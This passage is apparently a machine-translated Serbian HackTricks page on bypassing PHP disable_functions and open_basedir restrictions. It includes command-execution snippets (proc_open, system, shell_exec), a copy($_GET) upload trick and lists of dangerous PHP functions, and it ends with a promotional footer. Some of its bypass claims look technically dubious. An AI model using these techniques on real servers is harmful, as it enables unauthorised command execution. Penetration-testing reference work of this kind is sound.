Funkcija `dl()` se koristi za dinamičko učitavanje PHP ekstenzija. Međutim, ova funkcija je često onemogućena u većini PHP konfiguracija. Da biste je zaobišli, možete koristiti sledeći trik:

```php
dl('php_' . substr(PHP_VERSION, 0, 3) . '.' . PHP_SHLIB_SUFFIX);
```

Ovaj kod će pokušati učitati PHP ekstenziju koja odgovara verziji PHP-a koja se koristi na ciljnom serveru.

#### `putenv()`

Funkcija `putenv()` se koristi za postavljanje vrednosti sistemskih promenljivih. Ako je funkcija `putenv()` dozvoljena, možete je koristiti za zaobilaženje `disable_functions` i `open_basedir` ograničenja. Evo primera:

```php
putenv('PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin');
```

Ovaj kod će promeniti vrednost putanje (`PATH`) sistema na ciljnom serveru.

#### `proc_open()`

Funkcija `proc_open()` se koristi za pokretanje spoljnih komandi na serveru. Ako je funkcija `proc_open()` dozvoljena, možete je koristiti za zaobilaženje `disable_functions` i `open_basedir` ograničenja. Evo primera:

```php
$descriptorspec = array(
   0 => array("pipe", "r"),  // Standardni ulaz
   1 => array("pipe", "w"),  // Standardni izlaz
   2 => array("pipe", "w")   // Standardni izlaz greške
);

$process = proc_open('ls -la', $descriptorspec, $pipes);

if (is_resource($process)) {
   fclose($pipes[0]);
   echo stream_get_contents($pipes[1]);
   fclose($pipes[1]);
   fclose($pipes[2]);
   proc_close($process);
}
```

Ovaj kod će izvršiti komandu `ls -la` na ciljnom serveru i prikazati rezultat.

#### `system()`

Funkcija `system()` se takođe koristi za izvršavanje spoljnih komandi na serveru. Ako je funkcija `system()` dozvoljena, možete je koristiti za zaobilaženje `disable_functions` i `open_basedir` ograničenja. Evo primera:

```php
system('ls -la');
```

Ovaj kod će takođe izvršiti komandu `ls -la` na ciljnom serveru i prikazati rezultat.

#### `shell_exec()`

Funkcija `shell_exec()` se koristi za izvršavanje komandi u shell okruženju. Ako je funkcija `shell_exec()` dozvoljena, možete je koristiti za zaobilaženje `disable_functions` i `open_basedir` ograničenja. Evo primera:

```php
echo shell_exec('ls -la');
```

Ovaj kod će izvršiti komandu `ls -la` na ciljnom serveru i prikazati rezultat.

```php
extract    // Opens the door for register_globals attacks (see study in scarlet).
parse_str  // works like extract if only one argument is given.
putenv
ini_set
mail       // has CRLF injection in the 3rd parameter, opens the door for spam.
header     // on old systems CRLF injection could be used for xss or other purposes, now it is still a problem if they do a header("location: ..."); and they do not die();. The script keeps executing after a call to header(), and will still print output normally. This is nasty if you are trying to protect an administrative area.
proc_nice
proc_terminate
proc_close
pfsockopen
fsockopen
apache_child_terminate
posix_kill
posix_mkfifo
posix_setpgid
posix_setsid
posix_setuid
```

### Funkcije datotečnog sistema

Prema RATS-u, sve funkcije datotečnog sistema u PHP-u su opasne. Neke od njih se ne čine vrlo korisnim napadaču. Međutim, neke su korisnije nego što možda mislite. Na primer, ako je allow\_url\_fopen=On, tada se URL može koristiti kao putanja do datoteke, pa se pozivom copy($\_GET\['s'], $\_GET\['d']); može otpremiti PHP skripta bilo gde na sistemu. Takođe, ako je sajt podložan zahtevu poslatom putem GET metode, svaka od tih funkcija datotečnog sistema može biti zloupotrebljena kako bi se kanalizovao napad ka drugom hostu preko vašeg servera.

**Otvori rukovalac datotečnog sistema**

```php
fopen
tmpfile
bzopen
gzopen
SplFileObject->__construct
```

**Upisivanje u datotečni sistem (delimično u kombinaciji sa čitanjem)**

Ova tehnika se koristi za upisivanje podataka u datotečni sistem. Može biti korisna u situacijama kada je potrebno izvršiti upisivanje podataka na serveru ili kada je potrebno čitati podatke iz datotečnog sistema.

Da biste koristili ovu tehniku, prvo morate pronaći putanju do ciljanog direktorijuma u datotečnom sistemu. Zatim možete koristiti odgovarajuće funkcije za upisivanje podataka u taj direktorijum.

Važno je napomenuti da ova tehnika može biti opasna i može dovesti do neovlašćenog pristupa ili oštećenja sistema. Stoga je važno da je koristite samo u okviru zakonskih i etičkih granica, kao deo legitimnog testiranja bezbednosti ili pentestinga.

```php
chgrp
chmod
chown
copy
file_put_contents
lchgrp
lchown
link
mkdir
move_uploaded_file
rename
rmdir
symlink
tempnam
touch
unlink
imagepng     // 2nd parameter is a path.
imagewbmp    // 2nd parameter is a path.
image2wbmp   // 2nd parameter is a path.
imagejpeg    // 2nd parameter is a path.
imagexbm     // 2nd parameter is a path.
imagegif     // 2nd parameter is a path.
imagegd      // 2nd parameter is a path.
imagegd2     // 2nd parameter is a path.
iptcembed
ftp_get
ftp_nb_get
scandir
```

**Čitanje sa fajl sistema**

```php
file_exists
-- file_get_contents
file
fileatime
filectime
filegroup
fileinode
filemtime
fileowner
fileperms
filesize
filetype
glob
is_dir
is_executable
is_file
is_link
is_readable
is_uploaded_file
is_writable
is_writeable
linkinfo
lstat
parse_ini_file
pathinfo
readfile
readlink
realpath
stat
gzfile
readgzfile
getimagesize
imagecreatefromgif
imagecreatefromjpeg
imagecreatefrompng
imagecreatefromwbmp
imagecreatefromxbm
imagecreatefromxpm
ftp_put
ftp_nb_put
exif_read_data
read_exif_data
exif_thumbnail
exif_imagetype
hash_file
hash_hmac_file
hash_update_file
md5_file
sha1_file
-- highlight_file
-- show_source
php_strip_whitespace
get_meta_tags
```

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
